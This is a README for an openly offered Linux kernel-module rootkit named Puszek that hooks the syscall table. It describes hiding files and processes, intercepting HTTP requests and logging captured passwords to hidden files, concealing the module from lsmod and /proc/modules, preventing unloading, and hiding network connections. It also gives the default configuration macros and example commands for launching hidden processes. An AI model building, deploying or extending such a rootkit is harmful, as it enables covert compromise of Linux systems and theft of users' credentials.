# Puszek  

Yet another LKM rootkit for Linux. It hooks syscall table.
  
### Features:  
  
1. Hide files that ends on configured suffix (`FILE_SUFFIX` - ".rootkit" by default).  
2. Hide processes that cmdline contains defined text (`COMMAND_CONTAINS` - ".//./" by default).  

Examples:

```
.//./malicious_process
```

``` 
wget http://old-releases.ubuntu.com/releases/zesty/ubuntu-17.04-desktop-amd64.iso .//./
```

3. Intercept HTTP requests.  
All intercepted GET and POST HTTP requests are logged to `/etc/http_requests[FILE_SUFFIX]`.  
When password is found in HTTP request it's additionally logged to `/etc/passwords[FILE_SUFFIX]`.
4. Rootkit module is invisible in `lsmod` output, file `/proc/modules`, and directory `/sys/module/`.  
5. It isn't possible to unload rootkit by `rmmod` command (if option `UNABLE_TO_UNLOAD` is set).
6. Netstat and similar tools won't see TCP connections of hidden processes.

### Configuration:  

The configuration is placed at the beginning of file `rootkit.c`.  
Below is a default configuration:

```C
//beginning of the rootkit's configuration
#define FILE_SUFFIX ".rootkit"    	//hiding files with names ending on defined suffix
#define COMMAND_CONTAINS ".//./"    //hiding processes which cmdline contains defined text
#define ROOTKIT_NAME "rootkit"    	//you need to type here name of this module to make this module hidden
#define SYSCALL_MODIFY_METHOD PAGE_RW   //method of making syscall table writeable, CR0 or PAGE_RW
#define UNABLE_TO_UNLOAD 0
#define DEBUG 0                     //this is for me :)
//end of configuration
```

### Tested on:  

```
Linux x 4.13.0-kali1-amd64 #1 SMP Debian 4.13.10-1kali2 (2017-11-08) x86_64 GNU/Linux
```
